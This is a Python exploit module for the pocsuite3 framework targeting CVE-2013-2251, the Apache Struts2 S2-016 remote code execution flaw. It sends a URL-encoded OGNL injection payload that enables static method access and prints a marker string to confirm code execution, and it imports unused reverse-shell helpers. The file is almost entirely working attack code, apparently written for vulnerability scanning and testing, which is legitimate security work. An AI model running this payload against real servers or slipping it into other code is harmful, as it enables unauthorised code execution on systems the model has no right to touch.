# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2013-2251"
    version ='1'
    author = ["lmx"]
    vulDate = "2013-07-09"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["https://vulhub.org/#/environments/struts2/s2-016/"]
    name ="S2-016 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '2.0.0 - 2.3.15'
    vulType = 'RCE'
    desc = '''
    struts2-016远程代码执行漏洞
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result ={}
        payload = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.print("web"),%23k8out.println("88888888"),%23k8out.close())}'''
        #url = self.url
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
                    
        r = requests.post(url=self.url,headers=headers,data=payload)

        try:
            if 'web88888888' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC) 
